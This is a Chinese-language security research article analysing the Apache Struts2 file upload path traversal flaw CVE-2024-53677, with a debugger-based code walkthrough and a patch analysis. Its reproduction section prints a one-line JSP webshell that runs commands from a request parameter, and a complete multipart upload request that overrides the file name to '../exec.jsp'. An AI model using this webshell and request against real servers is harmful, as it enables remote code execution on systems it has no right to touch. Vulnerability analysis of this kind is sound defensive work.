---
title: Apache Struts2 文件上传漏洞分析（CVE-2024-53677）
url: https://mp.weixin.qq.com/s?__biz=Mzg4Nzc3MTk3Mg==&mid=2247488851&idx=1&sn=efb4d5fe76d020e05760236c16b33ac5&chksm=cf841378f8f39a6eab0cdfd36b2528308afa3d73035190c02720c94c9d17a0b7629e7a6ece5b&scene=58&subscene=0#rd
source: 中孚安全技术研究
date: 2024-12-21
fetch_date: 2025-10-06T19:41:58.549038
---

# Apache Struts2 文件上传漏洞分析（CVE-2024-53677）

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/kAeFn7TN57ME7LEFMtgDSpiaVVibuX499K3pRcCia7ibqORw4wD3mbDryQv5zHN0VicEdaoPekR6uqBqG1dFfd1KI3w/0?wx_fmt=jpeg)

# Apache Struts2 文件上传漏洞分析（CVE-2024-53677）

元亨-blckder02

中孚安全技术研究

1. 前言

**官方公告:**
https://cwiki.apache.org/confluence/display/WW/S2-067

**漏洞描述：**
Apache Struts 的文件上传逻辑存在缺陷，如果应用程序使用了 FileUploadInterceptor，在进行文件上传时，攻击者可以操纵文件上传参数来启用路径遍历，在某些情况下，这可能导致上传可用于执行远程代码执行的恶意文件。

**影响版本：**
Apache Struts：
    2.0.0 - 2.3.37（EOL）
    2.5.0 - 2.5.33
    6.0.0 - 6.3.0.2

2. 环境搭建

可以参考[《Apache Struts2 文件上传漏洞分析（CVE-2023-50164）》](https://mp.weixin.qq.com/s?__biz=Mzg4Nzc3MTk3Mg==&mid=2247488378&idx=1&sn=1f8fe746251c491a981785d65aaf137c&scene=21#wechat_redirect)

将 pom.xml 中 Struts2 的版本改为 6.3.0.2 即可。

```
<dependency>      <groupId>org.apache.struts</groupId>      <artifactId>struts2-core</artifactId>      <version>6.3.0.2</version>    </dependency>
```

3. 漏洞复现

同样准备一个jsp木马文件。

```
<%Runtime.getRuntime().exec(request.getParameter("i"));%>
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/kAeFn7TN57ME7LEFMtgDSpiaVVibuX499KBGFtwJPcPutPbPTfCeic5A9jP0iapG4HWhAibic4X3GGnvCegEPHTzjnQw/640?wx_fmt=png&from=appmsg)

上传木马文件抓包，在下面添加一个参数，参数名设置为top.MyfileFileName，参数内容设置为木马文件保存的相对位置及文件名。

从响应包可以看到文件名覆盖成功。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/kAeFn7TN57ME7LEFMtgDSpiaVVibuX499K1iaaibOT7vVzemsz8R8Fd9tXSP934m0vYicPFdKVne2q0O10ib0M9MibZYA/640?wx_fmt=png&from=appmsg)

请求包：

```
POST /upload.action HTTP/1.1            Host: 127.0.0.1:8888            User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0            Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8            Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2            Accept-Encoding: gzip, deflate, br            Content-Type: multipart/form-data; boundary=---------------------------3701280597827013112747531662            Content-Length: 438            Origin: http://127.0.0.1:8888            Connection: keep-alive            Referer: http://127.0.0.1:8888/upload.action            Cookie: JSESSIONID=4209098B9C419F73225118698688A603            Upgrade-Insecure-Requests: 1            Priority: u=0, i                   -----------------------------3701280597827013112747531662            Content-Disposition: form-data; name="Myfile"; filename="S2-067.txt"            Content-Type: text/plain
<%Runtime.getRuntime().exec(request.getParameter("i"));%>            -----------------------------3701280597827013112747531662            Content-Disposition: form-data; name="top.MyfileFileName";             Content-Type: text/plain           ../exec.jsp            -----------------------------3701280597827013112747531662--
```

文件保存到了/uploads目录下，且文件名保存为构造传入的exec.jsp。

访问jsp文件，能成功执行命令。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/kAeFn7TN57ME7LEFMtgDSpiaVVibuX499KOibkQCLtaHk58mqPpdaOH7MUDUMibUj074bGPwfHA4uZRwEVeibgnoPmg/640?wx_fmt=png&from=appmsg)

4. 漏洞分析

经过对 S66 漏洞的修复，已经不能再使用大小写来二次调用属性的 setter 方法了。学习了 y4tacker 师傅的思路，通过先获取 OgnlValueStack 值栈中的栈顶对象，再访问其属性。
有三种形式获取栈顶对象：[0]、top、[0].top

![](https://mmbiz.qpic.cn/sz_mmbiz_png/kAeFn7TN57ME7LEFMtgDSpiaVVibuX499KwmibV4Mz4A4T9phh7PWVPPjicb1nUPhaV3jz8QKVxf9gziacWXib6vqvwA/640?wx_fmt=png&from=appmsg)

但是在参数绑定之前，会对参数进行合规校验，其中有条正则如下，要求(\[\d+])前面还需要存在一些其他字符，所以[0]和[0].top都无法通过参数合规性判断，所以只能使用top来获取栈顶对象。

```
\w+((\.\w+)|(\[\d+])|(\(\d+\))|(\['(\w-?|[\u4e00-\u9fa5]-?)+'])|(\('(\w-?|[\u4e00-\u9fa5]-?)+'\)))*
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/kAeFn7TN57ME7LEFMtgDSpiaVVibuX499Ksw8LibAxLJ7YyiaMMnxO7BNwzJcykwppbyupEqRMSqib6FZYHS4DchKkA/640?wx_fmt=png&from=appmsg)

前面部分的参数处理就不细说了，再看下 S66 那篇分析就可以了。这里就只看一下如何处理的top节点。

从 ParametersInterceptor.setParameters() 看起，对 OgnlValueStack 对象进行参数绑定。
可以看到，TreeMap 对象中，top.MyfileFileName 参数是排在最后一位的，这时前面三个参数都已经绑定完成了，这时 MyfileFileName 参数的是S2-067.txt。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/kAeFn7TN57ME7LEFMtgDSpiaVVibuX499KOkVAQS1maVP3u1hb66ibly9nHJjHiavf4pgyEq70E5xMJ6FGicv2ehCkg/640?wx_fmt=png&from=appmsg)

跟进到 OgnlUtil.compileAndExecute()，对 top.MyfileFileName 进行表达式解析并执行。（解析为链式节点ASTChain）

![](https://mmbiz.qpic.cn/sz_mmbiz_png/kAeFn7TN57ME7LEFMtgDSpiaVVibuX499K2HqJMOyKcFic8x134jy5GR8LZbdyuiaduQ5Sy0g8cpEYNgaqZZRibG78g/640?wx_fmt=png&from=appmsg)

跟进到 ASTChain.setValueBody()，遍历处理子节点。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/kAeFn7TN57ME7LEFMtgDSpiaVVibuX499KSIxJ4kp45MFZfBvd7NTia9MuHoQM71ksElwJ38VU3jSl5rXPDY7m43Q/640?wx_fmt=png&from=appmsg)

先获取 top 节点的值，到 CompoundRootAccessor.getProperty() 中有这样一段 if 判断，如果子节点为 top，root 不为空，就返回栈顶对象，即 UploadAction。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/kAeFn7TN57ME7LEFMtgDSpiaVVibuX499KOsndcB38Xu8MDIOTc1EyKc69m8mjtYl0ZWHOtPo25omu05lavqicnow/640?wx_fmt=png&from=appmsg)

接着就是为 UploadAction 对象的 MyfileFileName 属性设置值，ObjectPropertyAccessor.setPossibleProperty() 中尝试去调用 setter 方法。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/kAeFn7TN57ME7LEFMtgDSpiaVVibuX499KWlM5FqShQ6GsrWeFuSLc1OPVQXpzcTicM1OUz2ibwdA6h7Xe3IzgP1fw/640?wx_fmt=png&from=appmsg)

ConcurrentHashMap.get()，从缓存中先获取到 UploadAction 的所有 setter 方法，再从中获取 setMyfileFileName() 并返回。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/kAeFn7TN57ME7LEFMtgDSpiaVVibuX499KFnXY2Gvde4YBJ9E1lsdZZFO4cibWgDE1ibEj7e4N39ZJSCW5lKVQnr9g/640?wx_fmt=png&from=appmsg)

接着调用 setMyfileFileName()。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/kAeFn7TN57ME7LEFMtgDSpiaVVibuX499KiaAwPHBhiac2BpyhibiangG2uA7aXSibBQx0h50keWeB1nbdZB6MCnkExnA/640?wx_fmt=png&from=appmsg)

myfieFileName 被覆盖为../exec.jsp，后续解析路径穿越符，于是上传保存的文件路径就是/uploads/exec.jsp。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/kAeFn7TN57ME7LEFMtgDSpiaVVibuX499Kt6m1GXfic7r2g7iazKFIwoiaOREJoDPpBDehRMBSsiaibGMGaRkoicWq4UjQ/640?wx_fmt=png&from=appmsg)

5. 补丁分析

官方并没有针对这次利用方法发布补丁，而是在新版本中推出了新的文件上传拦截机制。
org.apache.struts2.interceptor.ActionFileUploadInterceptor
https://struts.apache.org/core-developers/action-file-upload

ActionFileUploadInterceptor 中直接从文件中获取参数信息，并没有把文件参数与请求中的参数进行合并。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/kAeFn7TN57ME7LEFMtgDSpiaVVibuX499KSo7H7TuxGp83G64IKYSjSZYNSfArZZdm48KkeLuuITJ62YVUwbRB4A/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/kAeFn7TN57ME7LEFMtgDSpiaVVibuX499KuyVpLMfWzLKptZgYlLNZ6Lqhhh6pJPyIsaWyY8Kwd2Yh4dibUROATVw/640?wx_fmt=png)

不过在执行 ActionFileUploadInterceptor 拦截器前，先执行了 FileUploadInterceptor，所以请求中构造的 top.MyfileFileName 还是被合并到了参数中。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/kAeFn7TN57ME7LEFMtgDSpiaVVibuX499KHETaCm6cy5SPHQpPAgCWBncibpeHm5z2h5VafL9O3ztUzlQ9rn8yNiaQ/640?wx_fmt=png&from=appmsg)

在参数绑定过程中仍然会覆盖 MyfileFileName 的值。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/kAeFn7TN57ME7LEFMtgDSpiaVVibuX499Ka4l5ucw81unEsxw5aHcJJBriaDaiaJe1GAicznBwRyF9Kf2Bev4BCzjrQ/640?wx_fmt=png&from=appmsg)

**参考链接：**https://y4tacker.github.io/2024/12/16/year/2024/12/Apache-Struts2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%80%BB%E8%BE%91%E7%BB%95%E8%BF%87-CVE-2024-53677-S2-067/

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/kAeFn7TN57PsW2f0hZ9GMoVzR27JHbGodEpRqzThKU1bj5iaAzS1k03cqQKOziayXgWVKCacR22m2d2ibJMGMWibJA/0?wx_fmt=png)

中孚安全技术研究

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/kAeFn7TN57PsW2f0hZ9GMoVzR27JHbGodEpRqzThKU1bj5iaAzS1k03cqQKOziayXgWVKCacR22m2d2ibJMGMWibJA/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过